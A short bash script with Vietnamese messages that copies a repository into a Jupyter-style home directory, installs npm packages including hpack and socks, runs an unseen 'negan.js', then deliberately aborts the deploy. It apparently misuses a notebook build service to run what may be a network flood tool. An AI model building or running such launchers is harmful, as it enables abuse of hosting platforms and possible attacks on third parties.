#!/bin/bash

echo "--------------------------------------------------"
echo "🔄 Sao chép file từ repo..."
echo "--------------------------------------------------"

cp -r . /home/jovyan/ 2>/dev/null

echo "✅ Kiểm tra file đã copy:"
ls -lah /home/jovyan/

echo "--------------------------------------------------"
echo "🔄 Cài đặt npm package..."
echo "--------------------------------------------------"

npm install hpack https commander colors socks

if [ $? -ne 0 ]; then
    echo "❌ Lỗi trong quá trình cài đặt npm package!"
    exit 1
fi

echo "✅ Hoàn thành cài đặt!"

echo "--------------------------------------------------"
echo "🚀 Chạy node negan.js..."
echo "--------------------------------------------------"

node negan.js

echo "🚨 Hủy deploy..."
exit 1
